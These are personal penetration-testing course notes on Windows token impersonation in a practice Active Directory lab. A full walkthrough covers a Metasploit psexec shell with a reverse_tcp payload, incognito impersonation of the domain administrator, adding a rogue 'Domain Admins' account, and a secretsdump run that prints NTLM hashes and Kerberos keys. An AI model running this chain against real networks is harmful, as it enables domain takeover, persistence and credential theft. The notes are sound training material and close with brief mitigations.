
## Quick-Use

**Commands**:

*Tools*:
- `incognito` - Metasploit module - used to impersonate a user if you have root shell on entry machine

## General

**Objectives**:
Two main types:
- *Delegate* - created for logging into a machine or using Remote Desktop
- *Impersonate* - "Non-interactive" such as attaching a network drive of a domain logon script

Impersonation allows you to pivot, for example to a domain admin so you can do things like run [[2_Studies/Courses/Current/CERTPREP - PJPT-Practical Jr Pen Tester/Practical Ethical Hacking/3_Exploitation/Post-Compromise Exploitation/Mimikatz]] to get additional hashes, or add a user that is a Domain admin so you can run [[2_Studies/Courses/Current/CERTPREP - PJPT-Practical Jr Pen Tester/Practical Ethical Hacking/2_Enumeration/Post-Compromise Enumeration/Active Directory/Pass the hash|secretsdump.py]] and compromise the DC

**Overview**:
Tokens are Temporary keys that allow you access to a system/network without having to provide credentials each time you access a file, like the concept of cookies in browsers, but for computers and workstations

## Mitigations

- Limit user/group token creation perms
- account tiering
- local admin restriction
## Examples

**Full Token impersonation lifecycle**:

*Within Metasploit, get a shell*

```bash
┌──(l1ch㉿kali)-[~]
└─$ msfconsole                                                           
Metasploit tip: Use the capture plugin to start multiple 
authentication-capturing and poisoning services
                                                  

 ______________________________________________________________________________
|                                                                              |
|                          3Kom SuperHack II Logon                             |
|______________________________________________________________________________|
|                                                                              |
|                                                                              |
|                                                                              |
|                 User Name:          [   security    ]                        |
|                                                                              |
|                 Password:           [               ]                        |
|                                                                              |
|                                                                              |
|                                                                              |
|                                   [ OK ]                                     |
|______________________________________________________________________________|
|                                                                              |
|                                                       https://metasploit.com |
|______________________________________________________________________________|


       =[ metasploit v6.4.96-dev                                ]
+ -- --=[ 2,568 exploits - 1,316 auxiliary - 1,683 payloads     ]
+ -- --=[ 433 post - 49 encoders - 13 nops - 9 evasion          ]

Metasploit Documentation: https://docs.metasploit.com/
The Metasploit Framework is a Rapid7 Open Source Project

msf > search psexec

Matching Modules
================

   #   Name                                         Disclosure Date  Rank       Check  Description
   -   ----                                         ---------------  ----       -----  -----------
   0   auxiliary/scanner/smb/impacket/dcomexec      2018-03-19       normal     No     DCOM Exec
   1   exploit/windows/smb/smb_relay                2001-03-31       excellent  Yes    MS08-068 Microsoft Windows SMB Relay Code Execution
   2     \_ action: CREATE_SMB_SESSION              .                .          .      Do not close the SMB connection after relaying, and instead create an SMB session
   3     \_ action: PSEXEC                          .                .          .      Use the SMB Connection to run the exploit/windows/psexec module against the relay target
   4     \_ target: Automatic                       .                .          .      .
   5     \_ target: PowerShell                      .                .          .      .
   6     \_ target: Native upload                   .                .          .      .
   7     \_ target: MOF upload                      .                .          .      .
   8     \_ target: Command                         .                .          .      .
   9   exploit/windows/smb/ms17_010_psexec          2017-03-14       normal     Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   10    \_ target: Automatic                       .                .          .      .
   11    \_ target: PowerShell                      .                .          .      .
   12    \_ target: Native upload                   .                .          .      .
   13    \_ target: MOF upload                      .                .          .      .
   14    \_ AKA: ETERNALSYNERGY                     .                .          .      .
   15    \_ AKA: ETERNALROMANCE                     .                .          .      .
   16    \_ AKA: ETERNALCHAMPION                    .                .          .      .
   17    \_ AKA: ETERNALBLUE                        .                .          .      .
   18  auxiliary/admin/smb/ms17_010_command         2017-03-14       normal     No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   19    \_ AKA: ETERNALSYNERGY                     .                .          .      .
   20    \_ AKA: ETERNALROMANCE                     .                .          .      .
   21    \_ AKA: ETERNALCHAMPION                    .                .          .      .
   22    \_ AKA: ETERNALBLUE                        .                .          .      .
   23  auxiliary/scanner/smb/psexec_loggedin_users  .                normal     No     Microsoft Windows Authenticated Logged In Users Enumeration
   24  exploit/windows/smb/psexec                   1999-01-01       manual     No     Microsoft Windows Authenticated User Code Execution
   25    \_ target: Automatic                       .                .          .      .
   26    \_ target: PowerShell                      .                .          .      .
   27    \_ target: Native upload                   .                .          .      .
   28    \_ target: MOF upload                      .                .          .      .
   29    \_ target: Command                         .                .          .      .
   30  auxiliary/admin/smb/psexec_ntdsgrab          .                normal     No     PsExec NTDS.dit And SYSTEM Hive Download Utility
   31  exploit/windows/local/current_user_psexec    1999-01-01       excellent  No     PsExec via Current User Token
   32  encoder/x86/service                          .                manual     No     Register Service
   33  auxiliary/scanner/smb/impacket/wmiexec       2018-03-19       normal     No     WMI Exec
   34  exploit/windows/smb/webexec                  2018-10-24       manual     No     WebExec Authenticated User Code Execution
   35    \_ target: Automatic                       .                .          .      .
   36    \_ target: Native upload                   .                .          .      .
   37  exploit/windows/local/wmi                    1999-01-01       excellent  No     Windows Management Instrumentation (WMI) Remote Command Execution


Interact with a module by name or index. For example info 37, use 37 or use exploit/windows/local/wmi

msf > use exploit/windows/smb/psexec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
msf exploit(windows/smb/psexec) > options

Module options (exploit/windows/smb/psexec):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   SERVICE_DESCRIPTION                    no        Service description to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                   no        The service display name
   SERVICE_NAME                           no        The service name
   SMBSHARE                               no        The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share


   Used when connecting via an existing SESSION:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   no        The session to run this module on


   Used when making a new connection via RHOSTS:

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   RHOSTS                      no        The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      445              no        The target port (TCP)
   SMBDomain  .                no        The Windows domain to use for authentication
   SMBPass                     no        The password for the specified username
   SMBUser                     no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.109.128  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf exploit(windows/smb/psexec) > set rhosts 192.168.109.138
rhosts => 192.168.109.138
msf exploit(windows/smb/psexec) > set smbuser fcastle
smbuser => fcastle
msf exploit(windows/smb/psexec) > set smbpass Password1
smbpass => Password1
msf exploit(windows/smb/psexec) > set smbdomain MARVEL.local
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```


*within the shell, load `incognito`, then impersonate as DOMAIN/admin

```
meterpreter > load incognito
Loading extension incognito...Success.
meterpreter > list_tokens -u
[-] The "list_tokens" command requires the "incognito" extension to be loaded (run: `load incognito`)
meterpreter > load incognito
Loading extension incognito...Success.
meterpreter > list_tokens -u

Delegation Tokens Available
========================================
Font Driver Host\UMFD-0
Font Driver Host\UMFD-1
MARVEL\Administrator
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM
Window Manager\DWM-1

Impersonation Tokens Available
========================================
No tokens available

meterpreter > impersonate_token MARVEL\\administrator
[+] Delegation token available
[+] Successfully impersonated user MARVEL\Administrator
meterpreter > getuid
Server username: MARVEL\Administrator
meterpreter > shell
Process 6076 created.
Channel 1 created.
Microsoft Windows [Version 10.0.19044.6575]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
marvel\administrator

C:\Windows\system32>net user /add hawkeye Password1@ /domain
net user /add hawkeye Password1@ /domain
The request will be processed at a domain controller for domain MARVEL.local.

The command completed successfully.


C:\Windows\system32>net group "Domain Admins" hawkeye /ADD /DOMAIN
net group "Domain Admins" hawkeye /ADD /DOMAIN
The request will be processed at a domain controller for domain MARVEL.local.

The command completed successfully.


C:\Windows\system32>^C
Terminate channel 2? [y/N]  y
meterpreter > 
```

*then in another terminal tab, dump the secrets*:

```bash
┌──(l1ch㉿kali)-[~]
└─$ secretsdump.py MARVEL.local/hawkeye:'Password1@'@192.168.109.137                                                       
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xe54efd9a56ccf17680bbb8caed297b26
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction failed: string index out of range
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
MARVEL\HYDRA-DC$:aes256-cts-hmac-sha1-96:4a28dc3f157ee3cb12d99ab62e29f56cb547be905576cf17a8090af6deffeb4a
MARVEL\HYDRA-DC$:aes128-cts-hmac-sha1-96:e92861cb439614ea46b79bed641b93be
MARVEL\HYDRA-DC$:des-cbc-md5:8f58437354e0521f
MARVEL\HYDRA-DC$:aad3b435b51404eeaad3b435b51404ee:fb1706c8b9f37639863cbce8ee0b5c2e:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x6cbbfebcf2c5f72b28f36afb7778a8e813129802
dpapi_userkey:0x39ab65679c2a937c9efce2d991d37447afb3bd6b
[*] NL$KM 
 0000   57 AA E7 DC 74 58 39 E0  21 5A 7A 2B 63 FB C9 87   W...tX9.!Zz+c...
 0010   25 71 D1 DF 95 7D 73 27  46 D3 4E D9 3E E1 EB 2D   %q...}s'F.N.>..-
 0020   AF 82 44 03 D6 47 59 59  92 20 5B A3 01 63 1A E3   ..D..GYY. [..c..
 0030   E4 65 96 52 49 01 93 E8  41 58 C2 10 83 B4 EA 9B   .e.RI...AX......
NL$KM:57aae7dc745839e0215a7a2b63fbc9872571d1df957d732746d34ed93ee1eb2daf824403d647595992205ba301631ae3e4659652490193e84158c21083b4ea9b
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:49a5286819887de3ea2e3fb849ad4f4d:::
MARVEL.local\tstark:1103:aad3b435b51404eeaad3b435b51404ee:1bc3af33d22c1c2baec10a32db22c72d:::
MARVEL.local\SQLService:1104:aad3b435b51404eeaad3b435b51404ee:f4ab68f27303bcb4024650d8fc5f973a:::
MARVEL.local\fcastle:1106:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
MARVEL.local\pparker:1107:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
hawkeye:1110:aad3b435b51404eeaad3b435b51404ee:43460d636f269c709b20049cee36ae7a:::
HYDRA-DC$:1000:aad3b435b51404eeaad3b435b51404ee:fb1706c8b9f37639863cbce8ee0b5c2e:::
SPIDERMAN$:1108:aad3b435b51404eeaad3b435b51404ee:7c92e7998ecc719dc3251a0a4b31b57f:::
THEPUNISHER$:1109:aad3b435b51404eeaad3b435b51404ee:8e88a9f9565858e39310332ded567cff:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:80765a8c50f4a84bf277e4791d0ff0e6ec441963592d75f703e03df75a985599
Administrator:aes128-cts-hmac-sha1-96:82a574a8952280774069b5bb7a6bd0cb
Administrator:des-cbc-md5:292ca7b5cd152c08
krbtgt:aes256-cts-hmac-sha1-96:d9ea24dd785afabfde155ddb0061489d427589a376509b2486520a06eb37d4d2
krbtgt:aes128-cts-hmac-sha1-96:a791e15c5c06f92817bc34b2ea26a7a0
krbtgt:des-cbc-md5:2a4fb94cdc7557d9
MARVEL.local\tstark:aes256-cts-hmac-sha1-96:c0253feb8fa1a0532844adabe1db7b12a0e9c2e12b84d6640ed886025c175b50
MARVEL.local\tstark:aes128-cts-hmac-sha1-96:68727fb995192f9766d6294ffd64080c
MARVEL.local\tstark:des-cbc-md5:f2253d9e1373adcd
MARVEL.local\SQLService:aes256-cts-hmac-sha1-96:7e434c38e06b23841e6764f58a7daaf8ab32c782b98c41e8a0cfe7bea0d00a93
MARVEL.local\SQLService:aes128-cts-hmac-sha1-96:0ad727708ef2aabfe159f71c579c9a0e
MARVEL.local\SQLService:des-cbc-md5:523d2c0ecdea6eba
MARVEL.local\fcastle:aes256-cts-hmac-sha1-96:35f093c1a2aafb4dffbf63201a8a9ec9171a621a3ff90b199bc92273a74d8409
MARVEL.local\fcastle:aes128-cts-hmac-sha1-96:7583c4fe87334691ef5e7fd863f636f9
MARVEL.local\fcastle:des-cbc-md5:4fa7ad454cc78954
MARVEL.local\pparker:aes256-cts-hmac-sha1-96:906e23c09d876f3238f3ff8f2c247388ab36f7bc744cfbd4cb2b8f5a14e8914f
MARVEL.local\pparker:aes128-cts-hmac-sha1-96:339d007f3b450b6233607587d7ee0103
MARVEL.local\pparker:des-cbc-md5:61756889adfb4c29
hawkeye:aes256-cts-hmac-sha1-96:70306b40ac0b9da21903551fa70b3191b61d88749e356b11cbe93721a0d3b471
hawkeye:aes128-cts-hmac-sha1-96:2ee48035a17365b1951d8a8105c917e4
hawkeye:des-cbc-md5:01f758f731b6757c
HYDRA-DC$:aes256-cts-hmac-sha1-96:4a28dc3f157ee3cb12d99ab62e29f56cb547be905576cf17a8090af6deffeb4a
HYDRA-DC$:aes128-cts-hmac-sha1-96:e92861cb439614ea46b79bed641b93be
HYDRA-DC$:des-cbc-md5:8aba3116b5f44058
SPIDERMAN$:aes256-cts-hmac-sha1-96:5fca53b05311cfdf983ec78168163938e1fb61d6aa9891124924fe5078374cf1
SPIDERMAN$:aes128-cts-hmac-sha1-96:f4aea8b00b486a7af78662237f024447
SPIDERMAN$:des-cbc-md5:f73e13347cc845f1
THEPUNISHER$:aes256-cts-hmac-sha1-96:77139fda37bded76183ea5437587deaaea3a83dcb29c65c01a1991476582a4ee
THEPUNISHER$:aes128-cts-hmac-sha1-96:2246ed01690c0963ba36c498f6687bdc
THEPUNISHER$:des-cbc-md5:645bdc579ef73440
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[-] SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running services are dependent on.
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
                                                                                                                                                                                         
┌──(l1ch㉿kali)-[~]
└─$ 

```
## Glossary